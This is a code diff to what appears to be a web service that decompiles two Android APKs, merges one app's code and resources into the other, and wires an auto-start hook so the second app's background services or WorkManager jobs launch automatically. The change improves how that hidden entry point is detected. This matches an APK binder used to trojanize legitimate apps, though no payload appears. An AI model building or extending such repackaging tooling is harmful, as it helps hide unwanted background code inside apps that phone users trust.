@@ -102,7 +102,8 @@ async def services(minor: UploadFile = File(...)):
         svc = manifest_merge.list_services(mdir)
         sched, hits = manifest_merge.detect_scheduler(mdir)
         return {"services": svc, "scheduler": sched, "hits": hits,
-                "app_class": manifest_merge.app_class(mdir)}
+                "app_class": manifest_merge.app_class(mdir),
+                "bootstraps": manifest_merge.detect_bootstraps(mdir)}
     except Exception as e:
         raise HTTPException(500, f"{e}\n" + "\n".join(logs))
     finally:
@@ -128,20 +129,29 @@ async def merge(major: UploadFile = File(...),
         run(["apktool", "d", "-f", major_apk, "-o", major_dir], log)
         run(["apktool", "d", "-f", minor_apk, "-o", minor_dir], log)
 
-        # pick the service to auto-start
-        found = manifest_merge.list_services(minor_dir)
-        svc = service.strip() or (found[0] if found else "")
-        if not svc:
-            raise RuntimeError("No <service> found in the minor app, and none was "
-                               "chosen. The minor app may do its background work a "
-                               "different way (WorkManager/receiver).")
+        # Decide what the auto-start hook does. Preference order:
+        #   1. an explicit choice from the UI (service name OR a "call:" token)
+        #   2. the app's own scheduling entry point (best for WorkManager apps)
+        #   3. the first declared service (fallback)
+        chosen = service.strip()
+        if not chosen:
+            boots = manifest_merge.detect_bootstraps(minor_dir)
+            if boots:
+                chosen = boots[0]["token"]
+            else:
+                svcs = manifest_merge.list_services(minor_dir)
+                chosen = svcs[0] if svcs else ""
+        if not chosen:
+            raise RuntimeError("Couldn't find anything in the minor app to start — "
+                               "no scheduling entry point and no <service>. Tell me "
+                               "what triggers its background work and I'll wire it.")
 
         merge_core.copy_resources(major_dir, minor_dir, log)
         merge_core.remap_ids(major_dir, minor_dir, log)
         merge_core.copy_smali(major_dir, minor_dir, log)
         merge_core.copy_tree_no_overwrite(major_dir, minor_dir, "assets", log)
         merge_core.copy_tree_no_overwrite(major_dir, minor_dir, "lib", log)
-        manifest_merge.merge(major_dir, minor_dir, svc, log)
+        manifest_merge.merge(major_dir, minor_dir, chosen, log)
 
         unsigned = os.path.join(job, "merged-unsigned.apk")
         aligned = os.path.join(job, "merged-aligned.apk")
@@ -156,7 +166,7 @@ async def merge(major: UploadFile = File(...),
         sched, _ = manifest_merge.detect_scheduler(minor_dir)
         token = os.path.basename(job)
         return JSONResponse({"ok": True, "download": f"/download/{token}",
-                             "service": svc, "scheduler": sched,
+                             "service": chosen, "scheduler": sched,
                              "log": "\n".join(logs)})
     except Exception as e:
         return JSONResponse({"ok": False, "error": str(e), "log": "\n".join(logs)},
